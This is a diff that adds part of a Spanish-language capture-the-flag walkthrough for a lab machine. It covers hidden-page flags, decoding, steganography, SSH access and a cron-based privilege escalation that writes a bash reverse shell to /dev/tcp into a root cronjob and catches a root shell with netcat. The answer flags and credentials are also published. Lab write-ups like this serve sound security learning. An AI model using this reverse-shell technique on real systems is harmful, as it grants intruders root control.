@@ -112,6 +112,132 @@ Y nos da porfin la flag:
 flag{1m_s3c0nd_fl4g}
 ````
 
+La flag 3 ya la había encontrado la primera de todas al entrar al http://10.10.44.25:65524/ inspeccionando la plantilla encontramos un hidden con esto dentro del css esta la flag3
+
+view-source:http://10.10.44.25:65524/
+````
+flag{9fdafbd64c47471a8f54cd3fc64cd312}
+````
+
+La flag4 ha sido más complicada, pero me he guiado por lpo que dice en el hidden, sabiendo que estaba codificado con BaseXX he ido al cyberchef,
+metetiendo en el input:
+````
+ObsJmP173N2X6dOrAgEAL0Vu
+````
+encontrandolo en:
+````
+view-source:http://10.10.44.25:65524/
+<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
+````
+
+Siempre hay que ver los hidden ya que dan mucha indo y a veces redirigen a algo que no está indexado
+
+Salida de ciberchef y flag4:
+````
+/n0th1ng3ls3m4tt3r
+````
+Inseccionando esta página vemos que hay otra flag, esta encryptada vamos ha realizar hashid para posibles lenguages:
+````
+hashid "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81"
+Analyzing '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81'
+[+] Snefru-256 
+[+] SHA-256 
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 
+[+] Skein-256 
+[+] Skein-512(256)
+````
+nos metemos en la página de md5hashing.net que he puesto el enlace antes e intentamos hacer una prueba: 
+Efectivamente Esta sería la Flag6
+````
+mypasswordforthatjob
+````
+Ya tenemos un password, he intentado hacer hydra con enumeración d usuarios por ssh pero sin exito, despues se me ha ocurriedo ver metadatos con imagenes ya que tenemos un password, en el mismo directorio había una imagen puesta de diferente modo a las que las demás etaban puestas entonces me la he descargado y he usado lo siguiente:
+````
+$ steghide extract -sf nidea.jpeg 
+
+Enter passphrase: 
+wrote extracted data to "secrettext.txt".
+                                                                                                                                                                                                                                          
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat secrettext.txt 
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+````
+vemos que esta en bonario el passowrd, vamos a pasarlo por cyberchef:
+````
+iconvertedmypasswordtobinary
+````
+y tenemos tambén el usuario
+
+Entremos por ssh 
+````
+$ sudo ssh boring@10.10.44.25 -p 6498
+````
+ya estamos dentro 
+
+Ahora dentro del user hay una flag, pero tambén esta codificada
+nos da esto:
+````
+synt{a0jvgf33zfa0ez4y}
+````
+Después de probar diferentes web y pensar sabiendo que al principio ponia flag de diferente modo en cyberchef y puesto ROT13, ya que parece substitución alfebática
+y en efecto, nos da la flag: 
+````
+flag{n0wits33msn0rm4l}
+````
+## Escalado de privilegios - Crontab
+
+Despúes de investigar he dado con hacer un:
+
+````
+cat /etc/crontab
+````
+Y tenemos un cronjob con permisos de sudo, entonces lo he editado y dentro le he puesto esto con los correspondientes campos
+````
+bash -i >& /dev/tcp/<ip tun0>/4444 0>&1
+````
+En mi maquina host:
+````
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.9.3.53] from (UNKNOWN) [10.10.160.200] 59056
+bash: cannot set terminal process group (837): Inappropriate ioctl for device
+bash: no job control in this shell
+root@kral4-PC:/var/www# whoami
+whoami
+root
+````
+Y ahora a por la flag que está en la carpeta inicial de root en /root
+haciendo un ls -la 
+````bash
+root@kral4-PC:~# ls -la
+ls -la
+total 40
+drwx------  5 root root 4096 Jun 15  2020 .
+drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
+-rw-------  1 root root    2 Jun 13 05:51 .bash_history
+-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
+drwx------  2 root root 4096 Jun 13  2020 .cache
+drwx------  3 root root 4096 Jun 13  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
+-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
+root@kral4-PC:~# cat .root.txt
+cat .root.txt
+flag{63a9f0ea7bb98050796b649e85481845}
+````
+
+
+
+
+
+
 
 
 
